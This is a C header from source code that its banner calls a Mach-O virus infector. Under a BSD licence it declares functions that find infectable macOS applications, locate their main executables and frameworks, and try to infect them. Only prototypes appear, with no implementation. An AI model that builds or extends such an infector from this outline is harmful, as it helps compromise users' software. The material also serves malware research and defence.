/*     _____                                                                  
 *  __|_    |__  ____   _  ______  ______  ______   __    _____  _____   ___  
 * |    |      ||    \ | ||   ___||   ___||   ___|_|  |_ /     \|     | |   | 
 * |    |      ||     \| ||   ___||   ___||   |__|_    _||     ||     \ |___| 
 * |____|    __||__/\____||___|   |______||______| |__|  \_____/|__|\__\|___| 
 *    |_____|                                                                 
 *
 * A mach-o virus infector
 *
 * Copyright (c) fG!, 2012,2013 - reverser@put.as - http://reverse.put.as
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS OR
 * IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED WARRANTIES
 * OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED.
 * IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
 * NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF
 * THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * infection_operations.h
 *
 */

#ifndef boubou_infector_infection_operations_h
#define boubou_infector_infection_operations_h

#include "structures.h"

char* get_random_libname(void);
int find_infectable_apps(NSMutableArray *targets);

uint8_t find_main_executable(char *targetPath, target_info_t *targetInfo);
uint8_t find_infectable_framework(NSString *targetAppFolder, target_info_t *targetInfo);

uint8_t try_to_infect_mainbinary(NSString *targetAppFolder);
uint8_t try_to_infect_frameworks(NSString *targetAppFolder);

#endif
